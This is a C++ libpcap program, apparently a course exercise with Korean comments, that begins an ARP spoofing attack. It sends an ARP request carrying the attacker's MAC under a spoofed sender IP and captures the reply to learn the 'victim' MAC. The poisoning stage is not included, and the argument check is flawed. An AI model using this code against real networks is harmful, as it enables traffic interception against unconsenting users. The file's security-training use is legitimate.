#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

std::string get_attacker_mac(const char *interface) {
    struct ifreq ifr;
    unsigned char *macAddress;
    std::string result;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        return result; // 에러가 발생하면 빈 문자열 반환
    }
    
    macAddress = (unsigned char*)ifr.ifr_hwaddr.sa_data;
    
    // MAC 주소를 문자열로 변환하여 반환
    char macStr[18]; // MAC 주소는 최대 17글자로 표현되며, 마지막에 널 문자를 추가해야 함
    snprintf(macStr, sizeof(macStr), "%02x:%02x:%02x:%02x:%02x:%02x",
             macAddress[0], macAddress[1], macAddress[2],
             macAddress[3], macAddress[4], macAddress[5]);
    
    close(sock);
    return macStr;
}

//std::string get_victim_mac()

void usage() {
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if ((argc < 4) && (argc % 2 != 0)) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    const char *interface = argv[1];
    std::string macAddress = get_attacker_mac(interface);
    
    printf("Attacker MAC = %s\n", macAddress.c_str()); // 추가된 부분
    
    EthArpPacket packet;
    //request => sender = attacker, target = victim
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // Broadcast MAC address
    packet.eth_.smac_ = Mac(macAddress.c_str()); // Sender's MAC address
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(macAddress.c_str()); // Sender's MAC address
    packet.arp_.sip_ = htonl(Ip(argv[3])); // Sender's IP address
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00"); // Target's MAC address (Unknown)
    packet.arp_.tip_ = htonl(Ip(argv[2])); // Target's IP address (Supplied as argument)
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        // int pcap_next_ex(pcap_t *p, struct pcap_pkthdr **pkt_header, const u_char **pkt_data);
        // 네트워크 인터페이스로부터 다음 패킷을 읽어오는 역할을 한다.
        // p: pcap_open_live() 함수에서 반환된 pcap 디스크립터입니다.
        // pkt_header: 포인터로써, 캡처된 패킷의 헤더 정보를 담는 구조체인 pcap_pkthdr의 포인터가 저장될 곳입니다. 이 구조체에는 패킷의 타임스탬프와 길이 등의 정보가 저장됩니다.
        // pkt_data: 포인터로써, 캡처된 패킷의 데이터가 저장될 곳입니다.
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        memcpy(&packet, recv_packet, sizeof(EthArpPacket));
        //printf("%d\n", packet.arp_.sip_);
        //printf("%d\n", htonl(Ip(argv[2])));
        if (packet.eth_.type_ != htons(EthHdr::Arp)) continue;
        if ((uint32_t)packet.arp_.sip_ == htonl(Ip(argv[2]))) {
            printf("Victim MAC = %s\n", std::string(packet.arp_.smac_).c_str());
            break;
        }
    }
    
    pcap_close(handle);
}
